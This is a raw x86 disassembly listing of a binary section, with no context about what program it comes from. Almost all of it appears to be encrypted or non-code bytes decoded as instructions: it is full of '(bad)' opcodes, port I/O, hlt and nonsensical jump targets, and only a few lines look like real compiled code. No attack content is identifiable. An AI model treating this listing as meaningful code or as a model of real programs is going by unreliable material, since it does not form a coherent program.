  414289:	jo     0x414244
  41428b:	jle    0x4142fd
  41428d:	jo     0x4142d4
  41428f:	mov    dl,0x9c
  414291:	jp     0x4142c2
  414293:	xchg   ebx,eax
  414294:	mov    eax,0x9ded93ce
  414299:	jl     0x414242
  41429b:	stos   BYTE PTR es:[edi],al
  41429c:	retf   
  41429d:	xchg   BYTE PTR [esp+eax*8-0x5f9670a],ah
  4142a4:	in     eax,dx
  4142a5:	or     al,0xd3
  4142a7:	xchg   edx,eax
  4142a8:	test   al,0x0
  4142aa:	test   eax,0x484c68da
  4142af:	inc    esp
  4142b0:	test   BYTE PTR [edi],dl
  4142b2:	cmc    
  4142b3:	into   
  4142b4:	aam    0xa1
  4142b6:	(bad)  
  4142b7:	sub    esi,DWORD PTR [eax+0x5b]
  4142ba:	or     eax,DWORD PTR [ebx]
  4142bc:	hlt    
  4142bd:	push   edx
  4142be:	out    0xb9,al
  4142c0:	ja     0x41431e
  4142c2:	jmp    0x41425b
  4142c4:	fucomi st,st(1)
  4142c6:	push   es
  4142c7:	outs   dx,DWORD PTR ds:[esi]
  4142c8:	push   ebx
  4142c9:	cwde   
  4142ca:	add    al,0x2d
  4142cc:	stos   DWORD PTR es:[edi],eax
  4142cd:	add    al,0xb9
  4142cf:	jb     0x414337
  4142d1:	and    cl,BYTE PTR [edx+0x199dea9c]
  4142d7:	inc    eax
  4142d8:	or     ebx,esi
  4142da:	pop    edx
  4142db:	mov    ebx,DWORD PTR [ecx+0x6118c5]
  4142e1:	and    BYTE PTR [esi*1+0x3c193c09],dh
  4142e8:	test   DWORD PTR [edx],0x62063eb3
  4142ee:	sub    bh,dh
  4142f0:	push   ecx
  4142f1:	scas   eax,DWORD PTR es:[edi]
  4142f2:	inc    eax
  4142f3:	shr    BYTE PTR [esi],1
  4142f5:	pop    esi
  4142f6:	jg     0x414288
  4142f8:	add    al,0x95
  4142fa:	sub    DWORD PTR ds:0xd39d16b,ecx
  414300:	xchg   edx,eax
  414301:	inc    edx
  414302:	mov    dh,bh
  414304:	hlt    
  414305:	(bad)  
  414306:	push   esi
  414307:	adc    DWORD PTR [edi+0x2c6858bc],ebx
  41430d:	adc    cl,bl
  41430f:	sub    bh,cl
  414311:	jl     0x4142c2
  414313:	(bad)  
  414314:	(bad)  
  414316:	jg     0x414368
  414318:	icebp  
  414319:	jmp    0x41431d
  41431b:	enter  0x8dd9,0x87
  41431f:	lock adc ebx,0x84c27f5f
  414326:	loopne 0x41433a
  414328:	jae    0x4142ed
  41432a:	cmp    ch,BYTE PTR ds:0x2fb4cb98
  414330:	jns    0x4142b2
  414332:	add    edx,DWORD PTR [edx-0x69]
  414335:	add    DWORD PTR [ecx-0x17],eax
  414338:	fwait
  414339:	cmc    
  41433a:	(bad)  
  41433b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41433c:	and    DWORD PTR [esi-0x63065e95],edx
  414342:	or     edx,eax
  414344:	in     al,0x2c
  414346:	cs (bad) 
  414348:	nop
  414349:	pop    ecx
  41434a:	push   0xd1ef8dac
  41434f:	inc    esi
  414350:	sbb    eax,0x32399861
  414355:	in     eax,0x50
  414357:	dec    ebp
  414358:	sbb    eax,0x8c187aef
  41435d:	push   0x13
  41435f:	dec    ebp
  414360:	adc    eax,0xf4daa747
  414365:	mov    al,0x91
  414367:	test   BYTE PTR [edx+0x12],0xcb
  41436b:	push   edx
  41436c:	test   BYTE PTR ds:0x5e8075a3,0x3f
  414373:	or     ah,BYTE PTR [ecx-0x2c]
  414376:	xor    BYTE PTR ds:0xe9eeb37d,bh
  41437c:	loop   0x41432d
  41437e:	push   es
  41437f:	loopne 0x4143d9
  414381:	(bad)  
  414382:	aam    0x97
  414384:	jmp    0x414359
  414386:	ins    DWORD PTR es:[edi],dx
  414387:	add    al,0x67
  414389:	and    BYTE PTR [eax],ch
  41438b:	int3   
  41438c:	pop    eax
  41438d:	shr    BYTE PTR [esi+0x54],cl
  414390:	stc    
  414391:	jmp    0x4230:0x6b245350
  414398:	add    ebp,edx
  41439a:	or     DWORD PTR [ebp+0x16448eed],edx
  4143a0:	adc    BYTE PTR ds:0x7e6f517a,ah
  4143a6:	ror    DWORD PTR [edx-0x77],1
  4143a9:	lods   eax,DWORD PTR ds:[esi]
  4143aa:	fisttp QWORD PTR [ebx+esi*2-0x7]
  4143ae:	push   0xbaee2d13
  4143b3:	clc    
  4143b4:	gs loopne 0x414349
  4143b7:	sbb    DWORD PTR [edi+0x3a21acc4],0x62217d39
  4143c1:	sbb    BYTE PTR [ebx+0x9],bl
  4143c4:	adc    eax,0x958168a4
  4143c9:	mov    ds:0xaef2a475,eax
  4143ce:	jge    0x414412
  4143d0:	or     al,0x13
  4143d2:	mov    ch,0x9f
  4143d4:	sub    dl,BYTE PTR [edi]
  4143d6:	ins    DWORD PTR es:[edi],dx
  4143d7:	ret    
  4143d8:	loopne 0x4143b5
  4143da:	sub    BYTE PTR [eax+0x68],0xb5
  4143de:	dec    esp
  4143df:	(bad)  
  4143e0:	(bad)  
  4143e1:	std    
  4143e2:	xchg   ebx,eax
  4143e3:	inc    ebp
  4143e4:	xchg   DWORD PTR [ecx+ebx*2-0x34],esi
  4143e8:	and    ebx,0x223f5a9c
  4143ee:	and    BYTE PTR [ecx+0x1d],bl
  4143f1:	jecxz  0x41440c
  4143f3:	push   ebx
  4143f4:	adc    al,ch
  4143f6:	jne    0x414431
  4143f8:	dec    eax
  4143f9:	and    al,0x58
  4143fc:	inc    ecx
  4143fd:	scas   eax,DWORD PTR es:[edi]
  4143fe:	mov    al,ds:0x65ec4a37
  414403:	pop    es
  414404:	or     esi,DWORD PTR [esi+0x62]
  414407:	adc    al,0x20
  414409:	xchg   ebx,eax
  41440a:	jo     0x4143e8
  41440c:	xor    al,0x22
  41440e:	pusha  
  41440f:	pushf  
  414410:	in     al,0x60
  414412:	loopne 0x4143db
  414414:	push   eax
  414415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414416:	mov    ds:0x640fe5f5,al
  41441b:	in     al,0x84
  41441d:	arpl   di,dx
  41441f:	outs   dx,DWORD PTR ds:[esi]
  414420:	xor    esp,0x79
  414423:	mov    cl,0x7b
  414425:	shr    BYTE PTR [edi-0x6a1b7dae],1
  41442b:	aaa    
  41442c:	mov    ebx,0x2ad10a27
  414431:	data16 mov bl,ah
  414434:	push   ebp
  414435:	and    ebx,0xcfc8cf87
  41443b:	push   ebp
  41443c:	rol    BYTE PTR [ebx],cl
  41443e:	neg    BYTE PTR [esi+0x5a21fc01]
  414444:	xchg   edx,eax
  414445:	outs   dx,DWORD PTR ds:[esi]
  414446:	outs   dx,DWORD PTR ds:[esi]
  414447:	int    0x98
  414449:	les    ecx,FWORD PTR [esi]
  41444b:	push   esp
  41444c:	or     eax,0xe13f8cab
  414451:	fnstenv [eax]
  414453:	ja     0x4143e4
  414455:	cmp    DWORD PTR [eax],edi
  414457:	push   esi
  414458:	push   ebx
  414459:	fsubr  DWORD PTR [edi+ebx*4]
  41445c:	mov    ah,0x92
  41445e:	mov    esp,ebx
  414460:	jecxz  0x4144c2
  414462:	xchg   ebp,eax
  414463:	enter  0x8725,0x6f
  414467:	(bad)  
  414468:	enter  0x975b,0x67
  41446c:	inc    ebx
  41446d:	mov    eax,ds:0x936d64e
  414472:	mov    al,0xcc
  414474:	pop    esi
  414475:	loop   0x41446d
  414477:	aaa    
  414478:	and    BYTE PTR [eax-0x43],0xbd
  41447c:	cmp    ch,dl
  41447e:	lds    esi,FWORD PTR [ebp*4+0x6a0fa3bc]
  414485:	call   ecx
  414487:	fdiv   DWORD PTR [edx-0x5a7da65f]
  41448d:	popf   
  41448e:	lahf   
  41448f:	lods   eax,DWORD PTR ds:[esi]
  414490:	jnp    0x4144bb
  414492:	dec    BYTE PTR [edi]
  414494:	inc    esi
  414495:	ins    DWORD PTR es:[edi],dx
  414496:	push   esi
  414497:	mov    esi,0xdd060397
  41449c:	cmp    cl,cl
  41449e:	nop
  41449f:	in     eax,dx
  4144a0:	push   0xffffff96
  4144a2:	mov    bh,0x6
  4144a4:	push   cs
  4144a5:	sbb    BYTE PTR [ecx-0x5c],bh
  4144a8:	mov    cl,BYTE PTR [eax]
  4144aa:	cmp    ebx,edx
  4144ac:	pop    edx
  4144ad:	fmulp  st(3),st
  4144af:	ficomp DWORD PTR [eax+edi*1+0x556f79e7]
  4144b6:	cdq    
  4144b7:	add    eax,0x4cfcde7b
  4144bc:	jecxz  0x4144ab
  4144be:	push   ebp
  4144bf:	xor    dl,al
  4144c1:	mov    al,0xb0
  4144c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144c4:	add    ebp,DWORD PTR [edx-0x32]
  4144c7:	enter  0xcb89,0xf7
  4144cb:	dec    ebx
  4144cc:	test   esp,eax
  4144ce:	push   ss
  4144cf:	ins    DWORD PTR es:[edi],dx
  4144d0:	imul   esi,DWORD PTR [edx+0x3e],0xe4a6a9fd
  4144d7:	push   ecx
  4144d8:	pop    ss
  4144d9:	test   al,0xda
  4144db:	ins    DWORD PTR es:[edi],dx
  4144dc:	iret   
  4144dd:	inc    ecx
  4144de:	aaa    
  4144df:	stos   BYTE PTR es:[edi],al
  4144e0:	inc    eax
  4144e1:	adc    esi,DWORD PTR [eax+0x66]
  4144e4:	add    bl,BYTE PTR [esi-0x30]
  4144e7:	lds    edx,FWORD PTR [ebx-0x7f]
  4144ea:	fstp   TBYTE PTR [ebx+0x14bd72ed]
  4144f0:	retf   
  4144f1:	cmova  ecx,DWORD PTR cs:[eax]
  4144f5:	int3   
  4144f6:	test   DWORD PTR [edx],esp
  4144f8:	in     eax,dx
  4144f9:	mov    eax,ds:0xd955189e
  4144fe:	in     al,dx
  4144ff:	mov    bh,0x9a
  414501:	sbb    BYTE PTR [eax],0xc0
  414504:	xor    al,BYTE PTR [eax+0x79]
  414507:	and    al,0x93
  414509:	mov    ch,0xb8
  41450b:	xchg   DWORD PTR [eax-0x16],edi
  41450e:	and    DWORD PTR [ecx+0x6155da32],ecx
  414514:	retf   
  414515:	aam    0x2
  414517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414518:	add    eax,DWORD PTR [edx+edx*4+0x4f]
  41451c:	xor    DWORD PTR [edx],0x50c4c3f2
  414522:	lea    ebx,[ebp+0x77]
  414525:	or     al,dh
  414527:	fisttp WORD PTR [edi-0x3]
  41452a:	jo     0x4144ec
  41452c:	inc    edx
  41452d:	or     BYTE PTR [eax+0x6a594f43],dl
  414533:	fs cdq 
  414535:	jmp    0x24b34c
  41453a:	push   esp
  41453b:	pop    ss
  41453c:	inc    edi
  41453d:	cmp    al,0x9
  41453f:	sbb    DWORD PTR [eax+0x3755678f],eax
  414545:	push   ecx
  414546:	(bad)  
  414547:	orps   xmm2,XMMWORD PTR [ecx-0x232e3b69]
  41454e:	jne    0x414528
  414550:	xor    edi,edi
  414552:	out    0x42,al
  414554:	idiv   bh
  414556:	jne    0x414528
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xd0fbeb4
  414576:	sub    DWORD PTR [edi],ecx
  414578:	leave  
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x4145cd
  414581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414582:	(bad)  
  414583:	into   
  414584:	test   bh,cl
  414586:	(bad)  
  414587:	out    dx,eax
  414588:	popf   
  414589:	mov    dh,0x9f
  41458b:	add    DWORD PTR fs:[edi-0x49],esp
  41458f:	push   cs
  414590:	xor    DWORD PTR [edi],ebp
  414592:	xor    al,BYTE PTR [ecx+ecx*1-0x4d]
  414596:	sbb    al,dh
  414598:	mov    ds:0xf756ceaa,al
  41459d:	lods   eax,DWORD PTR ds:[esi]
  41459e:	test   BYTE PTR [esp+edi*1],al
  4145a1:	push   0xffffffd5
  4145a3:	add    ecx,DWORD PTR [edx-0x3413c898]
  4145a9:	cmp    DWORD PTR [edi-0x145980e3],edx
  4145af:	adc    BYTE PTR [edi],dl
  4145b1:	and    DWORD PTR [ebx+0x16],ebp
  4145b4:	jmp    0x44756b0d
  4145b9:	add    eax,0x460e90f1
  4145be:	fistp  DWORD PTR [ebx+0x33]
  4145c1:	push   0x475e3d2b
  4145c6:	xchg   esi,esp
  4145c8:	sub    dh,BYTE PTR [eax]
  4145ca:	sbb    dl,BYTE PTR [eax-0x73]
  4145cd:	add    dl,BYTE PTR [edx+0x7b]
  4145d0:	inc    ebp
  4145d1:	jbe    0x4145ed
  4145d3:	dec    edx
  4145d4:	jno    0x41457e
  4145d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145d7:	lods   eax,DWORD PTR ds:[esi]
  4145d8:	mov    dl,BYTE PTR [edx]
  4145da:	pop    eax
  4145db:	lock pop edx
  4145dd:	sahf   
  4145de:	scas   eax,DWORD PTR es:[edi]
  4145df:	fnstenv [edx]
  4145e1:	sub    esi,esi
  4145e3:	sahf   
  4145e4:	jmp    0x414620
  4145e6:	ret    0x4401
  4145e9:	add    al,0x75
  4145eb:	push   cs
  4145ec:	cmc    
  4145ed:	push   ebp
  4145ee:	xor    edi,DWORD PTR [ecx]
  4145f0:	pop    es
  4145f1:	mov    ecx,0xceaeece6
  4145f6:	fdiv   DWORD PTR [ebp+0x4ae83296]
  4145fc:	adc    esp,edi
  4145fe:	sti    
  4145ff:	push   ebx
  414600:	dec    ebx
  414601:	pop    eax
  414602:	dec    ebx
  414603:	aam    0x77
  414605:	sbb    BYTE PTR [eax+0x21],al
  414608:	pop    ss
  414609:	sahf   
  41460a:	retf   0xd61b
  41460d:	and    al,0xed
  41460f:	pop    ebx
  414610:	je     0x414654
  414612:	push   DWORD PTR [edi+0x15663225]
  414618:	and    BYTE PTR [edi+eax*8-0x2ffec609],dl
  41461f:	pop    edi
  414620:	mov    bl,0x9a
  414622:	mov    ds:0x720eb7b4,eax
  414627:	adc    edx,DWORD PTR [ebx+eax*1+0x74]
  41462b:	mov    ch,0xb7
  41462d:	cs in  al,0x1d
  414630:	arpl   WORD PTR [esi-0x603f0109],bx
  414636:	xor    edi,edi
  414638:	das    
  414639:	shl    DWORD PTR [edi],cl
  41463b:	adc    al,0xb
  41463d:	sub    al,0x9b
  41463f:	aad    0xcb
  414641:	adc    ah,bl
  414643:	ja     0x4145e6
  414645:	mov    ah,0x32
  414647:	sbb    esi,DWORD PTR [ebx-0x60]
  41464a:	test   ecx,eax
  41464c:	test   DWORD PTR [esi-0x2c3445ee],eax
  414652:	add    ecx,DWORD PTR [edi+0x61]
  414655:	adc    ebp,ebx
  414657:	pop    ds
  414658:	sbb    edx,DWORD PTR [eax]
  41465a:	enter  0x885d,0x1e
  41465e:	push   0x65
  414660:	lahf   
  414661:	dec    esi
  414662:	pop    esp
  414663:	test   al,0x4c
  414665:	jo     0x41461f
  414667:	or     bh,cl
  414669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41466a:	or     ebx,DWORD PTR [ecx+0x8]
  41466d:	pop    esi
  41466e:	aaa    
  41466f:	add    eax,0xd293c00f
  414674:	sbb    ah,bh
  414676:	mov    ebp,es
  414678:	sbb    eax,0x85d8813e
  41467d:	mov    bh,0xdc
  41467f:	cmp    edi,DWORD PTR [ebx]
  414681:	test   eax,0x5a4fae5c
  414686:	mov    al,0xb6
  414688:	test   BYTE PTR [esi],dh
  41468a:	xor    esi,eax
  41468c:	out    dx,eax
  41468d:	cs adc eax,edx
  414690:	test   al,bl
  414692:	fsubrp st(2),st
  414694:	mov    BYTE PTR [esi],ah
  414696:	xchg   ecx,eax
  414697:	mov    ebp,0x66eb37b7
  41469c:	xchg   BYTE PTR [ebp-0x50fe2c0f],bl
  4146a2:	bound  ebx,QWORD PTR [ecx+0x5e]
  4146a5:	out    dx,eax
  4146a6:	inc    ebp
  4146a7:	mov    cl,BYTE PTR [eax-0x478d8482]
  4146ad:	inc    esi
  4146ae:	js     0x41463a
  4146b0:	mov    dh,0xb0
  4146b2:	push   es
  4146b3:	push   esi
  4146b4:	idiv   DWORD PTR [ecx-0x1e]
  4146b7:	aas    
  4146b8:	jge    0x41470b
  4146ba:	sub    ch,BYTE PTR [ebx-0x67466276]
  4146c0:	add    al,0x62
  4146c2:	push   0x7d159583
  4146c7:	leave  
  4146c8:	and    dl,ch
  4146ca:	jo     0x41474a
  4146cc:	adc    BYTE PTR [edx],bl
  4146ce:	jae    0x41473a
  4146d0:	or     eax,0xffa9af33
  4146d5:	xchg   esp,eax
  4146d6:	cdq    
  4146d7:	fisub  DWORD PTR [edi+0x4be6f75]
  4146dd:	into   
  4146de:	sbb    al,BYTE PTR [ebp+eiz*8+0x67]
  4146e2:	in     eax,0x79
  4146e4:	icebp  
  4146e5:	ds loopne 0x4146f5
  4146e8:	and    eax,DWORD PTR [esp]
  4146eb:	pop    ebp
  4146ec:	sub    ah,0xae
  4146ef:	sbb    dl,BYTE PTR [edx]
  4146f1:	jg     0x414687
  4146f3:	xchg   ebx,eax
  4146f4:	lahf   
  4146f5:	bound  edx,QWORD PTR [ebx-0x26]
  4146f8:	cmp    eax,0x8fce9a5e
  4146fd:	(bad)  
  4146fe:	stc    
  4146ff:	xchg   esi,eax
  414700:	add    BYTE PTR [edx+0x45],bh
  414703:	push   esi
  414704:	daa    
  414705:	and    eax,0x5ef8a09a
  41470a:	xor    DWORD PTR [ecx+0x2438423c],eax
  414710:	int    0x4c
  414712:	push   0x60
  414714:	adc    BYTE PTR [edx],bh
  414716:	mov    ah,0xf1
  414718:	dec    esi
  414719:	xor    eax,ebx
  41471b:	jno    0x41473a
  41471d:	ficom  WORD PTR [ebx+0x30]
  414720:	xor    al,BYTE PTR [ebx-0x5e]
  414723:	jbe    0x414725
  414725:	mov    ?,WORD PTR [ebx]
  414727:	adc    al,0x96
  414729:	lods   al,BYTE PTR ds:[esi]
  41472a:	jae    0x414730
  41472c:	ficom  DWORD PTR [ebx-0x3c]
  41472f:	push   es
  414730:	cwde   
  414731:	xchg   edi,eax
  414732:	les    ebp,FWORD PTR [edi-0x518f9312]
  414738:	dec    edx
  414739:	retf   0xad38
  41473c:	jbe    0x41477a
  41473e:	push   eax
  41473f:	cwde   
  414740:	mov    fs:0x1292f002,eax
  414746:	leave  
  414747:	and    esp,DWORD PTR [eax+0x5b6f8d18]
  41474d:	sub    DWORD PTR [ecx],0x39108a9c
  414753:	xor    cl,BYTE PTR [ebx-0x348888b8]
  414759:	aad    0xf7
  41475b:	sub    edi,DWORD PTR [ebp+0x46]
  41475e:	inc    edi
  41475f:	push   ebx
  414760:	inc    edi
  414761:	xor    BYTE PTR [ebx+0x119f4d64],dh
  414767:	bound  ebx,QWORD PTR [ebx+0x69]
  41476a:	push   edi
  41476b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41476c:	inc    edi
  41476d:	and    ebx,edi
  41476f:	cdq    
  414770:	xchg   ebp,eax
  414771:	fdiv   QWORD PTR [eax]
  414773:	addr16 or al,0xe4
  414776:	gs aad 0xf7
  414779:	pop    eax
  41477a:	xlat   BYTE PTR ds:[ebx]
  41477b:	ror    BYTE PTR [eax-0xab8b6c5],0x3d
  414782:	aam    0xae
  414784:	inc    eax
  414785:	add    al,0x95
  414787:	ins    DWORD PTR es:[edi],dx
  414788:	xchg   edi,eax
  414789:	xchg   esi,eax
  41478a:	retf   0x88c8
  41478d:	into   
  41478e:	daa    
  41478f:	jg     0x414793
  414791:	jns    0x41478e
  414793:	dec    ebx
  414794:	xchg   ebx,eax
  414795:	xchg   esp,eax
  414796:	add    bh,bl
  414798:	sub    BYTE PTR [ebp-0x4011e010],0x9e
  41479f:	and    DWORD PTR [eax],0x443d9258
  4147a5:	cmp    ebx,DWORD PTR [ebx]
  4147a7:	push   eax
  4147a8:	xor    al,0x33
  4147aa:	lds    esi,FWORD PTR [edi+0x322b4757]
  4147b0:	outs   dx,BYTE PTR ds:[esi]
  4147b1:	int    0x5a
  4147b3:	fs cmp BYTE PTR es:[edx-0x4],ah
  4147b8:	mov    al,ds:0x3c3866ea
  4147bd:	push   esi
  4147be:	je     0x414779
  4147c0:	in     eax,dx
  4147c1:	ds ins DWORD PTR es:[edi],dx
  4147c3:	int3   
  4147c4:	in     eax,0x4
  4147c6:	mov    DWORD PTR [edx+eax*2-0x2c799759],ebx
  4147cd:	inc    ebx
  4147ce:	mov    ecx,0x53e54dcc
  4147d3:	cmp    al,0xb5
  4147d5:	mov    bh,0x97
  4147d7:	sub    al,BYTE PTR [esi-0x1d110352]
  4147dd:	push   ds
  4147de:	xlat   BYTE PTR ds:[ebx]
  4147df:	loopne 0x41485f
  4147e1:	mov    bl,0xf4
  4147e3:	(bad)  
  4147e4:	cmp    DWORD PTR [edx-0x6a],eax
  4147e7:	stc    
  4147e8:	loope  0x414846
  4147ea:	loope  0x414808
  4147ec:	ja     0x4147b9
  4147ee:	inc    esi
  4147ef:	mov    ebx,0x4f6ba17b
  4147f4:	jmp    0xfccc84ff
  4147f9:	addr16 nop
  4147fb:	(bad)  
  4147fc:	mov    dh,0x4b
  4147fe:	in     eax,0x27
  414800:	imul   ebp,DWORD PTR [ebx],0x73
  414803:	nop
  414804:	(bad)  
  414805:	(bad)  
  414807:	addr16 mov eax,0xd83db63d
  41480d:	jp     0x41484c
  41480f:	add    eax,0xd489e94b
  414814:	adc    al,0x26
  414816:	cmp    al,BYTE PTR [di+0x1058]
  41481b:	add    ebx,DWORD PTR [eax]
  41481d:	int    0x27
  41481f:	loopne 0x414830
  414821:	sub    eax,0x920735a6
  414826:	(bad)  
  414827:	in     al,dx
  414828:	ins    DWORD PTR es:[edi],dx
  414829:	sub    dl,ah
  41482b:	pop    edi
  41482c:	js     0x4147d6
  41482e:	and    bl,BYTE PTR [esi+0x40d4ac5c]
  414834:	mov    bh,0x9b
  414836:	mov    esi,0x4777e202
  41483b:	xor    eax,0x87df8d59
  414840:	sub    ah,BYTE PTR [ebx+0x8]
  414843:	icebp  
  414844:	loopne 0x414810
  414846:	mov    ecx,0x35f84d8b
  41484b:	push   ebp
  41484c:	or     BYTE PTR [ecx+0x7],dl
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x41483d
  414861:	pop    esi
  414862:	and    eax,0x7f7d12ef
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4148b8
  41486d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41486e:	inc    ebp
  41486f:	imul   edi,ebp,0xabd4e5b1
  414875:	ds js  0x414864
  414878:	popf   
  414879:	cs mov cl,0x55
  41487c:	cmp    eax,0x9a26c2f3
  414881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414882:	mov    al,0x1a
  414884:	enter  0x9874,0x72
  414888:	rcl    DWORD PTR [ebx],0xf0
  41488b:	dec    edx
  41488c:	cmp    eax,0x156fe7b9
  414891:	imul   ebx,DWORD PTR ds:0x8c11a2c0,0x1a04dbc8
  41489b:	jle    0x41482b
  41489d:	dec    ebx
  41489e:	sbb    eax,DWORD PTR [edi]
  4148a0:	imul   ebp,ecx,0x43c18915
  4148a6:	xor    eax,0x92dc7904
  4148ab:	mov    al,0x5d
  4148ad:	imul   edi,esp,0x79
  4148b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148b1:	xchg   ebx,eax
  4148b2:	lock lock lea eax,ss:[ecx]
  4148b7:	mov    esp,0x90aeeb4c
  4148bc:	and    eax,0x8f3e746e
  4148c1:	inc    ebp
  4148c2:	arpl   WORD PTR [ecx],bx
  4148c4:	ins    BYTE PTR es:[edi],dx
  4148c5:	stc    
  4148c6:	in     al,0xfc
  4148c8:	in     eax,dx
  4148c9:	mov    ch,0x6e
  4148cb:	sar    dh,0xb6
  4148ce:	pop    ss
  4148cf:	stc    
  4148d0:	push   0xf96c39c5
  4148d5:	out    dx,eax
  4148d6:	fdivr  DWORD PTR [ebx-0x20]
  4148d9:	jp     0x4148fb
  4148db:	adc    eax,0x95ea6a55
  4148e0:	mov    bl,0xe2
  4148e2:	mov    esi,0x1b63222b
  4148e7:	arpl   WORD PTR [edi],di
  4148e9:	and    ch,dl
  4148eb:	adc    esp,edi
  4148ed:	mov    ds:0xcee4fa6a,eax
  4148f2:	push   ds
  4148f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148f4:	xor    al,0xe0
  4148f6:	inc    ecx
  4148f7:	scas   eax,DWORD PTR es:[edi]
  4148f8:	jmp    0x8554:0x1fb891b9
  4148ff:	mov    bl,0x49
  414901:	cmp    BYTE PTR [ebp-0x6e],0x28
  414905:	ret    0x9fc1
  414908:	or     eax,0x2ab8c291
  41490d:	add    eax,0xad2375b7
  414912:	(bad)  
  414913:	pop    edx
  414914:	dec    edi
  414915:	loope  0x41494c
  414917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414918:	xchg   ebx,eax
  414919:	mov    esp,0x5fe62a71
  41491e:	mov    ebp,ds
  414920:	les    eax,FWORD PTR [edi-0x9]
  414923:	leave  
  414924:	sar    bh,0x96
  414927:	pop    edi
  414928:	dec    edi
  414929:	shl    esi,cl
  41492b:	xchg   DWORD PTR [esi+0x1],edi
  41492e:	xor    eax,0xb8f966ec
  414933:	jae    0x4149a9
  414935:	mov    edi,0xd66da863
  41493a:	add    ch,BYTE PTR [edi+0x12731a66]
  414940:	pop    esi
  414941:	cmp    DWORD PTR [ecx-0x79],edi
  414944:	dec    ebp
  414945:	sub    bh,BYTE PTR [eax]
  414947:	icebp  
  414948:	dec    edx
  414949:	ss pop edi
  41494b:	pop    esi
  41494c:	mov    ah,BYTE PTR [ecx+0x523348bd]
  414952:	shl    DWORD PTR [ebx+0x55e4f9b7],cl
  414958:	jecxz  0x4149ba
  41495a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41495b:	and    cl,BYTE PTR [ebx+0x781e9356]
  414961:	nop
  414962:	std    
  414963:	push   0xffffffc4
  414965:	xor    al,0xdd
  414967:	sbb    al,BYTE PTR [edx-0x2c4b7a51]
  41496d:	mov    cl,0xe3
  41496f:	out    0xf7,eax
  414971:	jnp    0x4149ae
  414973:	sub    eax,0x43fd4473
  414978:	dec    ecx
  414979:	ret    
  41497a:	fnstcw WORD PTR [ecx-0x93f570b]
  414980:	out    0x48,al
  414982:	jl     0x414990
  414984:	bound  ebx,QWORD PTR [ebp+0x353eac93]
  41498a:	pop    esp
  41498b:	dec    eax
  41498c:	adc    al,0x43
  41498e:	pop    esp
  41498f:	(bad)  
  414990:	mov    cl,0x55
  414992:	dec    edx
  414993:	(bad)  
  414994:	(bad)  
  414995:	iret   
  414996:	lods   eax,DWORD PTR ds:[esi]
  414997:	in     al,0x24
  414999:	pop    eax
  41499a:	pop    ss
  41499b:	mov    al,ds:0x5f56748
  4149a0:	sub    eax,0xb184f544
  4149a5:	repnz lahf 
  4149a7:	mov    edi,0x57f8421d
  4149ac:	pusha  
  4149ad:	xor    DWORD PTR [esi],0x6a90197c
  4149b3:	mov    al,0xa7
  4149b5:	fmulp  st(6),st
  4149b7:	dec    edx
  4149b8:	cdq    
  4149b9:	xchg   ecx,eax
  4149ba:	sub    eax,0xb4769f8d
  4149bf:	sbb    BYTE PTR [ebp-0x7c635f0d],bh
  4149c5:	inc    esi
  4149c6:	and    dl,BYTE PTR ss:[esi-0x37]
  4149ca:	sbb    eax,DWORD PTR [esi-0x3d]
  4149cd:	xchg   esp,eax
  4149ce:	push   ss
  4149cf:	fwait
  4149d0:	das    
  4149d1:	push   esp
  4149d2:	int3   
  4149d3:	stos   DWORD PTR es:[edi],eax
  4149d4:	or     al,0x8a
  4149d6:	dec    edx
  4149d7:	cwde   
  4149d8:	or     ebp,DWORD PTR [eax]
  4149da:	retf   
  4149db:	stc    
  4149dc:	fld    DWORD PTR [esi+ebx*1-0x3a]
  4149e0:	aad    0xa1
  4149e2:	mov    edx,DWORD PTR [edi-0x31]
  4149e5:	push   0x16
  4149e7:	(bad)  
  4149e8:	mov    dl,0x72
  4149ea:	push   0x1f35513
  4149ef:	js     0x414988
  4149f1:	cld    
  4149f2:	mov    DWORD PTR [edi+edi*2+0x1b],edi
  4149f6:	push   0xac5e8394
  4149fb:	pop    ss
  4149fc:	mov    ?,WORD PTR [edi]
  4149fe:	mov    edi,0xa04133e8
  414a03:	mov    WORD PTR ds:0xc780836d,fs
  414a09:	and    bl,bh
  414a0b:	mov    DWORD PTR [eax+0x1c80b103],esp
  414a11:	test   ch,bh
  414a13:	dec    esp
  414a14:	and    edx,DWORD PTR [ebp+0x3]
  414a17:	mov    esp,0x59a609ae
  414a1c:	sbb    eax,0x919dc7a7
  414a21:	and    edi,DWORD PTR [eax-0x7c]
  414a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a25:	xor    esp,ebx
  414a27:	mov    esp,DWORD PTR [edx-0x76]
  414a2a:	sbb    BYTE PTR [ebp+0x6b],0xab
  414a2e:	js     0x414a5b
  414a30:	jp     0x414a2c
  414a32:	nop
  414a33:	sbb    DWORD PTR [ebp+0xf58d675],eax
  414a39:	dec    ecx
  414a3a:	jle    0x414ab0
  414a3c:	mov    dl,0xde
  414a3e:	or     DWORD PTR [ecx-0x3e99c87b],ebx
  414a44:	fcom   QWORD PTR [ebx+ebp*1-0xc]
  414a48:	inc    edi
  414a49:	icebp  
